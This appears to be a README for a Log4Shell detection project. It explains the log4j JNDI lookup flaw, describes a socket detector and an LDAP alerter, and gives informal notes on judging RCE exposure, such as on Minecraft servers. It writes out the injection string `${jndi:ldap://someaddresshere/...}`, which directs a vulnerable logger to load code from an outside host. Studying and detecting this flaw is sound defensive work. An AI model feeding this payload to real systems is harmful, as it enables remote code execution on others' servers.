# Log4Shell Zero-Day Exploit

if attacker manage to log this string `${jndi:ldap://someaddresshere/param1=value1}`
to log4j it somehow loads the class/java bytecode sent by Attacker Controlled LDAP Server. The bytecode could be used to
execute any malicious code or do some little trolling.

take this with grain of salt, I'm not a security expert.


inb4:

https://user-images.githubusercontent.com/49940811/176066056-e96eef48-42f2-47d3-b270-477c2a19b654.mp4

## Detection

### Patched

- Mitigated by deleting `org.apache.logging.log4j.core.lookup.JndiLookup` somehow didn't crash
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919169712435388466/unknown.png)

### Unpatched

- Note: 1.16.5 Minecraft Server RCE exploit
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919170755843989534/unknown.png)
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919172251771895878/unknown.png)

### [MainDetector.java](standalone-detector/src/main/java/itzbenz/MainDetector.java)

Use simple socket to listen on port 1389 then close the socket once its connected no external dependency

- Note: not always the case, sometimes it doesn't bother to load class url location given by LDAP Server
- Vulnerable to lookup:\
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919166884425900082/unknown.png)

- Log:\
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919166938654072852/unknown.png)

going to throw error if its is vulnerable

### [MainAlerter.java](standalone-detector/src/main/java/itzbenz/MainAlerter.java)

Use `com.unboundid:unboundid-ldapsdk` library to host LDAP server

- Note: doesn't mean it's vulnerable to RCE exploit.
- Vulnerable to lookup:
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919168285709312000/unknown.png)
- LADP Server logs:
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919171844836311050/unknown.png)

### DNS Log

Both sender and receiver are logged which mean they are vulnerable

- Note: if it's get logged, doesn't mean it's vulnerable to RCE
- Vulnerable to lookup:
  ![](https://cdn.discordapp.com/attachments/840041811384860707/919174049861619752/unknown.png)

## Conclusion

- if java do LDAP lookup doesn't mean it is always vulnerable, but if is load the classpath provided then it is ?
  - vulnerable to RCE and LDAP lookup:
    ![](https://cdn.discordapp.com/attachments/919142724114972744/919448027058540554/unknown.png)
  - not vulnerable because java don't fetch bytecode ??, still vulnerable to LDAP lookup:
    ![](https://cdn.discordapp.com/attachments/919142724114972744/919448406924083210/unknown.png)

- to test if it's actually vulnerable to RCE, try to use harmless payloads if its running then its vulnerable.

- if `com.sun.jndi.ldap.object.trustURLCodebase` property is set to `true` then you are vulnerable like really else, the
  attacker can use existing classpath
  ![](https://cdn.discordapp.com/attachments/918290369639227434/919240541810610206/unknown.png)

- if you found the victim log and see this:

```
  Caused by: java.lang.ClassNotFoundException: itzbenz.payload.ObjectPayloadSerializable
        at java.net.URLClassLoader.findClass(Unknown Source)
        at java.lang.ClassLoader.loadClass(Unknown Source)
        at sun.misc.Launcher$AppClassLoader.loadClass(Unknown Source)
        at java.lang.ClassLoader.loadClass(Unknown Source)
  ```

it's safe because it will not load classpath provided by attacker ?? though it's still doing LDAP lookup which is large
attack surface.

note: (after updating java 8, the minecraft server seem not load the classpath)

# Disclaimer

This project can only be used for educational purposes. Using this software against target systems without prior
permission is illegal, and any damages from misuse of this software will not be the responsibility of the author.
